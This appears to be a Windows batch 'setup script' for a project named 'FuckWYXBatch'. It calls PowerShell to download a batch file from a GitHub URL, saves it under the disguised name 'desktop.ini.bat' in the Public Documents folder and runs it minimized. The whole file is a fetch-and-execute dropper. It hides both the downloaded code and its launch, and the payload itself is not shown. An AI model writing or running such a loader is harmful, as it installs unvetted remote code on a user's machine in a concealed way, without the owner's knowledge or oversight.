@echo off
:: FuckWYXBatch Steup Script(s)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/xiaozhu2007/FuckWYXBatch/blob/main/script.bat?raw=true' , 'C:\Users\Public\Documents\desktop.ini.bat');exit
start /min "C:\Users\Public\Documents\desktop.ini.bat"